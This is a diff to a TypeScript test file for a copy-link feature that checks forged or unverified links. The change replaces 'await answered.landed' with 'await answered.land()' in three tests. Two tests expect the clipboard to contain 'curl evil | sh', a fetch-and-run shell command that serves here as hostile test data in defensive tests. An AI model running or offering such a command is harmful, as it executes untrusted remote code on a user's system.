@@ -77,7 +77,7 @@ test("a forged copy link is refused at once, saying why, and the clipboard is un
     const answered = await h.frame(url);
     expect(answered.awaitsVerdict).toBe(true);
     expect(answered.verdict).toMatchObject({ ok: false, code: "BAD_REQUEST" });
-    await answered.landed;
+    await answered.land();
   }
   expect(h.copied).toEqual([]);
   expect(h.events).toHaveLength(2);
@@ -92,7 +92,7 @@ test("a link the bar drew is told verified before its click lands, and then land
   expect(answered.verdict).toEqual({ ok: true, output: "" });
   expect(h.copied).toEqual([]);
   release();
-  await answered.landed;
+  await answered.land();
   expect(h.copied).toEqual(["curl evil | sh"]);
   h.idle.dispose();
 });
@@ -101,7 +101,7 @@ test("a version 1 frame's writer has hung up, so its verdict goes to no one", as
   const h = host();
   const answered = await h.frame(TEST_SIGNER.signLink(COPY), 1);
   expect(answered.awaitsVerdict).toBe(false);
-  await answered.landed;
+  await answered.land();
   expect(h.copied).toEqual(["curl evil | sh"]);
   h.idle.dispose();
 });
